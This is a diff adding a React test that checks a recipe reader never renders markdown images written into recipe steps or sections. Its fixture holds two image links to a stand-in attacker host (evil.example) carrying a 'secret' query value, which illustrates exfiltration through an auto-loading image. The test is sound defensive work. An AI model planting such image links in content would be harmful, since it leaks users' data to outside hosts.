@@ -72,3 +72,19 @@ it("nudges towards Edit when there's nothing written", () => {
   expect(screen.getByText("Untitled")).toBeTruthy();
   expect(screen.getByText(/switch to Edit/)).toBeTruthy();
 });
+
+it("never loads an image named in the text", () => {
+  // An image loads by itself: one written into a recipe would send what the URL carries when it's opened.
+  const body: RecipeBody = {
+    ...BURGER,
+    steps: [{ text: "Blanda. ![smör](https://evil.example/x.png?d=secret)" }],
+    sections: [
+      { title: "Mer", text: "![](https://evil.example/y.png?d=secret)" },
+    ],
+  };
+  const { container } = render(
+    <RecipeReader title="Hamburgare" type="main" body={body} />,
+  );
+
+  expect(container.querySelector("img")).toBeNull();
+});
